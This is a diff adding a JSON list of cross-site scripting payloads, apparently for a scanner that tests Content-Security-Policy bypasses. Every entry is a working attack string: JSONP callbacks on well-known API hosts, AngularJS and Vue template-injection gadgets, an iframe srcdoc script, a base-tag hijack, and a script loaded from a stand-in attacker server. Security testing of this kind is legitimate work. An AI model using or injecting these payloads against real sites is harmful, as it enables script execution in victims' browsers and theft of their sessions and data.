@@ -1,0 +1,11 @@
+[
+  "<script src=\"https://www.google.com/complete/search?client=chrome&q=x&jsonp=__XSS__('{{TOKEN}}')\"></script>",
+  "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\"></script><div ng-app>{{constructor.constructor('__XSS__(\"{{TOKEN}}\")')()}}</div>",
+  "<script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js\"></script><div ng-app>{{constructor.constructor('__XSS__(\"{{TOKEN}}\")')()}}</div>",
+  "<base href=\"//attacker.controlled.server/\">",
+  "<iframe srcdoc=\"&lt;script&gt;parent.__XSS__('{{TOKEN}}')&lt;/script&gt;\"></iframe>",
+  "<script src=\"https://unpkg.com/vue@2.6.14/dist/vue.min.js\"></script><div id=\"app\">{{_c.constructor('__XSS__(\"{{TOKEN}}\")')()}}</div>",
+  "<script src=\"https://api.vk.com/method/wall.get?callback=__XSS__('{{TOKEN}}')\"></script>",
+  "<script src=\"https://query.yahooapis.com/v1/public/yql?callback=__XSS__('{{TOKEN}}')\"></script>",
+  "<link rel=\"preload\" href=\"//attacker.controlled.server/x.js\" as=\"script\"><script src=\"//attacker.controlled.server/x.js\"></script>"
+]
